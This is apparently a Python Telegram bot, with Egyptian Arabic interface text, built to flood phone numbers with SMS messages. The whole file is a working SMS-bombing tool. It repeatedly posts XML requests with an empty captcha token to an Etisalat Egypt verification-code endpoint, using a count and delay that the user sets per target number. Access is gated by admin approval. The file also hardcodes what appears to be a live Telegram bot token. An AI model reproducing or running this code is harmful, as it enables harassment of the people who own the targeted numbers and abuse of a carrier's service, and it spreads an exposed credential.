import asyncio
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    ContextTypes, ConversationHandler, MessageHandler, filters
)

# ========== بيانات ==========
TOKEN = "8441832522:AAF7JRh0aw1X2diiCFdg8Fx9cGU2L-1NXuY"  # توكنك
ADMIN_ID = 1056328647
URL = "https://mab.etisalat.com.eg:11003/Saytar/rest/quickAccess/sendVerCodeQuickAccessV4"
HEADERS = {
    'Host': "mab.etisalat.com.eg:11003",
    'User-Agent': "okhttp/5.0.0-alpha.11",
    'Connection': "Keep-Alive",
    'Accept': "text/xml",
    'Content-Type': "text/xml; charset=UTF-8",
}

numbers_data = {}  # {"0123456789": {"count": 5, "delay": 1.0}}
selected_numbers = set()
sending_task = None
stop_flag = False

approved_users = set()  # المستخدمين المقبولين
all_users = set()       # كل المستخدمين

# ======== /start =========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    all_users.add(user_id)

    if user_id != ADMIN_ID and user_id not in approved_users:
        await update.message.reply_text("⛔ البوت تحت إدارة الأدمن، انتظر الموافقة.")
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔔 مستخدم جديد محتاج موافقة: {user_id}")
        return

    await update.message.reply_text(
        "👋 أهلاً! هذه الأوامر:\n"
        "/add - إضافة رقم وعدد رسائل ووقت الانتظار\n"
        "/show - عرض الأرقام وعدد الرسائل والفاصل\n"
        "/send - إرسال الرسائل لأرقام مختارة"
    )

    # أزرار الإدارة تظهر للأدمن فقط
    if user_id == ADMIN_ID:
        keyboard = [
            [InlineKeyboardButton("👥 عرض كل المستخدمين", callback_data="admin_show_users")],
            [InlineKeyboardButton("✅ الموافقة على مستخدم", callback_data="admin_approve_user")],
            [InlineKeyboardButton("📊 عدد النشطين", callback_data="admin_active_users")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("⚙️ لوحة التحكم:", reply_markup=reply_markup)

# ======== /add =========
ASK_NUMBER, ASK_COUNT, ASK_DELAY = range(3)

async def add_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📨 ابعت الرقم:")
    return ASK_NUMBER

async def get_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text
    context.user_data["number"] = number
    await update.message.reply_text("📨 ابعت عدد الرسائل:")
    return ASK_COUNT

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        count = int(update.message.text)
        context.user_data["count"] = count
        await update.message.reply_text("⏱️ ابعت الوقت بالثواني بين كل رسالة:")
        return ASK_DELAY
    except ValueError:
        await update.message.reply_text("❌ لازم تبعت رقم صحيح للعدد، ابعت تاني:")
        return ASK_COUNT

async def get_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        delay = float(update.message.text)
        number = context.user_data["number"]
        count = context.user_data["count"]
        numbers_data[number] = {"count": count, "delay": delay}
        await update.message.reply_text(
            f"✅ تم تسجيل {count} رسالة للرقم {number} بفاصل {delay} ثانية بين كل رسالة."
        )
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("❌ لازم تبعت رقم صحيح للوقت بالثواني، ابعت تاني:")
        return ASK_DELAY

# ======== /show =========
async def show_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not numbers_data:
        await update.message.reply_text("❌ لا يوجد أرقام مسجلة.")
        return
    msg = "📌 الأرقام وعدد الرسائل والفاصل:\n"
    for num, data in numbers_data.items():
        msg += f"{num} : {data['count']} رسالة | كل {data['delay']} ثانية\n"
    await update.message.reply_text(msg)

# ======== دالة الإيقاف =========
async def stop_automation(context: ContextTypes.DEFAULT_TYPE):
    global stop_flag
    stop_flag = True

# ======== إرسال الرسائل =========
async def send_task_function(bot, chat_id, numbers_list):
    global stop_flag
    stop_flag = False
    for number in numbers_list:
        if stop_flag:
            await bot.send_message(chat_id=chat_id, text="🛑 تم إيقاف عملية الإرسال!")
            break
        info = numbers_data[number]
        count = info["count"]
        delay = info["delay"]
        for i in range(count):
            if stop_flag:
                break
            payload = f"""<?xml version='1.0' encoding='UTF-8' standalone='no' ?>
            <sendVerCodeQuickAccessRequest>
                <dial>{number}</dial>
                <hCaptchaToken></hCaptchaToken>
                <udid></udid>
            </sendVerCodeQuickAccessRequest>"""
            try:
                response = requests.post(URL, data=payload, headers=HEADERS)
                if "true" in response.text.lower():
                    await bot.send_message(chat_id=chat_id,
                                           text=f"✅ SMS رقم {i+1} اتبعت للرقم {number}")
                else:
                    await bot.send_message(chat_id=chat_id,
                                           text=f"⚠️ SMS رقم {i+1} فشل للرقم {number}")
            except Exception as e:
                await bot.send_message(chat_id=chat_id,
                                       text=f"❌ خطأ مؤقت للرقم {number}: {e}")
            await asyncio.sleep(delay)
    await bot.send_message(chat_id=chat_id, text="🎉 تم الانتهاء من عملية الإرسال!")
    selected_numbers.clear()

# ======== /send =========
async def send_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global selected_numbers
    if not numbers_data:
        await update.message.reply_text("❌ لا يوجد أرقام لإرسال الرسائل لها.")
        return
    selected_numbers = set()
    keyboard = [[InlineKeyboardButton(num, callback_data=num)] for num in numbers_data.keys()]
    keyboard.append([InlineKeyboardButton("🚀 إرسال", callback_data="send")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("📌 اختر الأرقام لإرسال الرسائل لها:", reply_markup=reply_markup)

async def send_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    global selected_numbers, sending_task

    data = query.data
    if data == "send":
        if not selected_numbers:
            await query.edit_message_text("❌ لم تختر أي رقم. ارجع واختار رقم واحد على الأقل.")
            return
        sending_task = asyncio.create_task(send_task_function(context.bot, query.message.chat.id, list(selected_numbers)))
        keyboard = [[InlineKeyboardButton("🛑 إيقاف العملية", callback_data="call_stop_automation")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"🚀 جاري إرسال الرسائل للأرقام: {', '.join(selected_numbers)}", reply_markup=reply_markup)

    elif data == "call_stop_automation":
        await stop_automation(context)
        await query.edit_message_reply_markup(reply_markup=None)
        await context.bot.send_message(chat_id=query.message.chat.id, text="🛑 تم إيقاف كل العمليات!")

    elif data.startswith("admin_"):
        if query.from_user.id != ADMIN_ID:
            await query.edit_message_text("⛔ هذه الأزرار للأدمن فقط.")
            return
        if data == "admin_show_users":
            msg = "👥 كل المستخدمين:\n" + "\n".join(str(uid) for uid in all_users)
            await query.edit_message_text(msg)
        elif data == "admin_approve_user":
            pending = [uid for uid in all_users if uid not in approved_users and uid != ADMIN_ID]
            if not pending:
                await query.edit_message_text("✅ لا يوجد مستخدمين محتاجين موافقة.")
            else:
                keyboard = [[InlineKeyboardButton(str(uid), callback_data=f"approve_{uid}")] for uid in pending]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await query.edit_message_text("اختر المستخدم للموافقة عليه:", reply_markup=reply_markup)
        elif data == "admin_active_users":
            await query.edit_message_text(f"📊 عدد النشطين: {len(approved_users)}")
    elif data.startswith("approve_"):
        uid = int(data.split("_")[1])
        approved_users.add(uid)
        await query.edit_message_text(f"✅ تم الموافقة على {uid}")
        await context.bot.send_message(chat_id=uid, text="✅ تم الموافقة عليك، يمكنك استخدام البوت الآن.")
    else:
        if data in selected_numbers:
            selected_numbers.remove(data)
        else:
            selected_numbers.add(data)
        keyboard = [[InlineKeyboardButton(f"✅ {num}" if num in selected_numbers else num, callback_data=num)] for num in numbers_data.keys()]
        keyboard.append([InlineKeyboardButton("🚀 إرسال", callback_data="send")])
        if sending_task and not sending_task.done():
            keyboard.append([InlineKeyboardButton("🛑 إيقاف العملية", callback_data="call_stop_automation")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        try:
            await query.edit_message_reply_markup(reply_markup=reply_markup)
        except:
            pass

# ======== main =========
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    add_conv = ConversationHandler(
        entry_points=[CommandHandler("add", add_number)],
        states={
            ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_number)],
            ASK_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
            ASK_DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_delay)],
        },
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("show", show_numbers))
    app.add_handler(add_conv)
    app.add_handler(CommandHandler("send", send_start))
    app.add_handler(CallbackQueryHandler(send_button))

    print("🤖 البوت شغال...")
    app.run_polling()

if __name__ == "__main__":
    main()